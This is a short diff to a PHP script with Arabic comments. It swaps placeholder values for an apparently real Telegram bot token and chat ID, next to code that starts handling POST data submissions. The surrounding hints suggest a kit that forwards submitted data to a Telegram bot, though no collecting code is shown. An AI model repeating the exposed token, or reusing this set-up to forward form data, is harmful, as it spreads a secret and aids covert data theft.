@@ -8,8 +8,8 @@
    ============================================================ */
 
 // ---------- إعدادات تيليجرام (نفس اللي في ghost.html) ----------
-define('TG_TOKEN',   'ضع_التوكن_هنا');
-define('TG_CHAT_ID', 'ضع_الايدي_هنا');
+define('TG_TOKEN',   '8990437503:AAEbLQn5Pe539tpZb-l47AHoWxMPOakftho');
+define('TG_CHAT_ID', '8278195073');
 
 // ---------- لو ده طلب إرسال بيانات (POST) ----------
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
